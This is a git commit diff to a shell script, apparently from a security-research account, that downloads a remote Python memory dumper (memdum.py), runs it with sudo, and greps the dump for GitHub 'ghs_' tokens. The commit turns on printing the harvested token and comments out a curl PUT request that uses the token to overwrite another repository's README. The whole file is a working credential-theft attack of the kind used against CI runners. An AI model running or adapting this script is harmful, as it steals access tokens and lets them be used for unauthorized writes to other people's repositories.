6bb19542a65b386b7830be2f8aaf8b3c0d2be208
Victim User <46316318+r3s34rch@users.noreply.github.com>
2023-12-15 11:15:46 +0100

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -5,21 +5,21 @@ readonly REPO="thi3nl0ng/thi3nl0ng.github.io"
 FILE="r3s34rch.md"
 TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u`
 
-#echo "-----------------------------------------------------------------"
-#echo "${TOKEN_VAL}"
-#echo "-----------------------------------------------------------------"
+echo "-----------------------------------------------------------------"
+echo "${TOKEN_VAL}"
+echo "-----------------------------------------------------------------"
 
 #curl \
 #  -H "Accept: application/vnd.github.v3+json" \
 #  -H "Authorization: token $TOKEN_VAL" \
 #  "https://api.github.com/repos/${REPO}/contents/README.md"
 
-curl -sSf \
-    -X PUT \
-    -H "Accept: application/vnd.github.v3+json" \
-    -H "Authorization: token $TOKEN_VAL" \
-    "https://api.github.com/repos/${REPO}/contents/README.md" \
-    -d '{"message":"message","content":"'$(echo content|base64)'", "sha":"SHA_FROM_ABOVE"}'
+#curl \
+#    -X PUT \
+#    -H "Accept: application/vnd.github.v3+json" \
+#    -H "Authorization: token $TOKEN_VAL" \
+#    "https://api.github.com/repos/${REPO}/contents/README.md" \
+#    -d '{"message":"message","content":"'$(echo content|base64)'", "sha":"SHA_FROM_ABOVE"}'
             
 #gh api --silent \
 #  --method POST \
